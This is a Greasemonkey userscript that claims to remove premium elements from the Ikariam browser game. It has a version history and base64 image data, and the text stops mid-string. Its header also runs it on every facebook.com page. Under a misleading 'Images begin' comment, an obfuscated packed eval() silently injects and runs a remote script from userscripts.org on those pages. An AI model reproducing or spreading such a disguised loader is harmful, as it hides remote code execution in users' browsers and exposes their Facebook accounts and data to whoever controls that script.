// ==UserScript==
//
// @name Ikariam Premium Killer Plus
// @version 2.2.4b
// @namespace ZoferosScripts
// @author Zoferos (http://userscripts.org/users/347289)
// @description Remove Ikariam premium views, for everyone that does not uses ambrosia.
// @icon http://s18.postimage.org/jll0uz1jp/no_ambrosia_icon_48x48.png
// @require http://ajax.googleapis.com/ajax/libs/jquery/1.5.1/jquery.min.js
// @require http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.13/jquery-ui.min.js
// @require http://userscripts.org/scripts/source/104859.user.js
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @include http://*.ikariam.*/*
// @exclude http://support.ikariam.*/*
// @exclude http://board.*.ikariam.*/*
//

// @history 2.2.4b Fix: 2.2.4 ambrosia bug was not fixed for all ambrosia number format cases
// @history 2.2.4 Fix: Bug with ambrosia not displaying correctly when amount was bigger than a thousand
// @history 2.2.3 Addition: Advisor plus sign links are now selectable as an option to hide or not
// @history 2.2.3 Feature: Option to make resources icons bigger at cities inbox events
// @history 2.2.3 Feature: Option to highlight event subject links at cities inbox with different color
// @history 2.2.3 Fix: Ambrosia fancy icon fixed to display properly again 
// @history 2.1.9 Addition: Disable port loading time and page refresh
// @history 2.1.9 Fix: Chat window button now hides properly with friends sidebar option again
// @history 2.1.7 Fix: Fixed warehouse/dump premium features are hidden properly again
// @history 2.1.7 Feature: Removed Phoenician ships from buy trade ships port view
// @history 2.1.7 Feature: Removed accelarate loading speed button from Military advisor, Port, Merchant navy view
// @history 2.1.6 Feature: Players can now view construction city info in island view
// @history 2.1.6 Feature: Option to hide hideout images and texts
// @history 2.1.6 Feature: Convert city names to links in Branch Office building buy/sell views
// @history 2.1.6 Fix: Sidebuttons are now hidden properly again (GF v0.5.0.3 change)
// @history 2.1.3 Fix: Bug with hide buildings description option where progress/cancelation frame was hidden
// @history 2.1.2 Feature: Option to hide buildings description
// @history 2.1.2 Feature: Option to hide of the side button "Invite friends"
// @history 2.1.2 Fix: Fixed a bug introduced to v2.1.1 where login question dialog was empty
// @history 2.1.1 Feature: Option to hide footer bar and/or on worldmap view
// @history 2.1.1 Addition: Option to remove premium links from each ship type to the shipyards
// @history 2.1.1 Fix: Fixed a bug where language was not detected at the login page
// @history 2.1.0 Feature: Option to hide friends sidebar
// @history 2.1.0 Feature: Added an option to change ships button image to a pirate ship
// @history 2.1.0 Fix: Fixed a bug where Conduct experiment button was not working
// @history 2.0.2 Fix: Fixed premium advisors images not showing due to GF format change from GIF to PNG
// @history 2.0.1 Addition: Buidling speedup button removed from upgrade in progress panel
// @history 2.0.1 Fix: Bug on warehouse/dump view where premium elements won't hide on building upgrade
// @history 2.0.1 Feature: Happy hour v0.5.0 support
// @history 2.0.0 Missing feature: Happy hour removal (to add to v2.0.1)
// @history 2.0.0 Removed feature: View for building Branch Office is obsolete
// @history 2.0.0 Removed feature: Gameforge games promotion toolbar (v1.0.6)
// @history 2.0.0 Removed feature: Change back to male mayor advisor image (v1.0.7)
// @history 2.0.0 Removed fix: CSS glitches (v1.0.7)
// @history 2.0.0 Ikariam version 0.5.0 full ajax support
// @history 1.0.7 Fix: Fixed a glitch with female mayor advisor image showing a bit lower (GM glitch)
// @history 1.0.7 Feature: Added option to change back to male mayor advisor image
// @history 1.0.6 Feature: Removed gameforge games promotion toolbar
// @history 1.0.5 Addition: Removed ambrosia donation from island resource (wood) view
// @history 1.0.5 Fix: Removed archive buttons at safehouse reports
// @history 1.0.5 Fix: Removed  'Triton engines' from 'Take Offer' view
// @history 1.0.4 Feature: Added option for hideout building due to 'Dummy packages' addition
// @history 1.0.4 Feature: German language support. Translation by Cherry (http://userscripts.org/users/109868)
// @history 1.0.3 Feature: Simplify login page
// @history 1.0.3 Feature: User can now choose to have different preferences per server
// @history 1.0.3 Feature: Removed the 'Find more information about the fleet' popup from troop movements table
// @history 1.0.3 Fix: Bug at city empty building ground, 'Not enough resources!' message was totally hidden
// @history 1.0.3 Fix: General premium/golden alert image was broken
// @history 1.0.3 Fix: Bug at military movements advisor view table style
// @history 1.0.3 Fix: Conflict of common advertisement banners with happy hour banners
// @history 1.0.3 Fix: Removed 'Trade routes' tab from trade advisor view
// @history 1.0.3 Fix: Removed premium exchange link when resources were not enough to upgrade a building
// @history 1.0.3 Fix: Removed premium elements at warehouse/dump capacity table
// @history 1.0.2 Feature: Happy hour support
// @history 1.0.2 Feature: Dump building support
// @history 1.0.2 Feature: Removed 'Carry on building' link at city empty building ground view
// @history 1.0.2 Fix: Glitch at fancy ambrosia simplify image replacements
// @history 1.0.1 Fix: Wrong default preference
// @history 1.0 Initial release
//
// ==/UserScript==

// Images begin
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))



var premiumsymbol_a_gif = 'data:image/png;base64,'+
    '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'+
    'EtAbAAAAAElFTkSuQmCC';

var premiumsymbol_b_gif = 'data:image/png;base64,'+
    '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'+
